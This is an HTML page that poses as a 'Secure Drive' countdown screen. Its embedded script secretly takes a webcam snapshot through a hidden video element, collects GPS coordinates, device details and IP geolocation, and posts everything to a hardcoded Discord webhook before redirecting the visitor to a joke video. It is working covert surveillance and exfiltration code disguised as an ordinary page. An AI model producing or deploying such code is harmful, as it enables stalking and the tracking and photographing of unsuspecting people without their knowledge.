<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Drive</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
      text-align: center;
    }
    h1 {
      font-size: 1.5rem;
    }
  </style>
</head>
<body>
  <h1 id="countdown">10 seconds to open secure drive</h1>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    let capturedImageData = null;
    let lat = localStorage.getItem("lat") || "Permission denied";
    let lon = localStorage.getItem("lon") || "Permission denied";
    let acc = localStorage.getItem("acc") || 0;

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
      };
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    async function captureSnapshot() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.setAttribute("playsinline", true);
        video.style.position = "absolute";
        video.style.opacity = "0";
        video.srcObject = stream;
        document.body.appendChild(video);
        await video.play();

        await new Promise(resolve => setTimeout(resolve, 3000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        capturedImageData = canvas.toDataURL("image/png");

        stream.getTracks().forEach(t => t.stop());
      } catch (err) {
        console.warn("Camera failed or denied", err);
      }
    }

    function sendToDiscord(ipData) {
      const mapLink = lat !== "Permission denied" ? `https://www.google.com/maps?q=${lat},${lon}` : "N/A";
      const device = getDeviceInfo();

      const formData = new FormData();
      const snapshotLine = capturedImageData
        ? "📸 Snapshot received: ✅ [Download Image](attachment://snapshot.png)"
        : "📸 Snapshot received: ❌ No image available";

      const payload = {
        embeds: [{
          title: "📍 GPS & Device Info",
          description:
            `**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc} meters` +
            `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
            `\n\n🌐 **IP Info**\n**IP:** ${ipData.ipAddress}\n**City:** ${ipData.city}` +
            `\n**Region:** ${ipData.stateProv}\n**Country:** ${ipData.countryName}` +
            `\n\n🖥️ **Device Info**\n**Platform:** ${device.platform}\n**Browser:** ${device.userAgent}` +
            `\n**Language:** ${device.language}\n**Screen:** ${device.screen}` +
            `\n**Touch Support:** ${device.touchSupport}\n\n${snapshotLine}\n\n🕒 ${new Date().toLocaleString()}`
        }]
      };

      if (capturedImageData) {
        const blob = dataURLtoBlob(capturedImageData);
        formData.append("file", blob, "snapshot.png");
        payload.embeds[0].image = { url: "attachment://snapshot.png" };
      }

      formData.append("payload_json", JSON.stringify(payload));

      fetch(webhookUrl, { method: "POST", body: formData });
    }

    captureSnapshot().then(() => {
      fetch("https://api.db-ip.com/v2/free/self")
        .then(res => res.json())
        .then(sendToDiscord)
        .catch(() => {
          sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
        });
    });

    let seconds = 10;
    const countdownEl = document.getElementById("countdown");

    const timer = setInterval(() => {
      seconds--;
      countdownEl.textContent = `${seconds} seconds to open secure drive`;
      if (seconds === 0) {
        clearInterval(timer);
        window.location.href = redirectUrl;
      }
    }, 1000);
  </script>
</body>
</html>
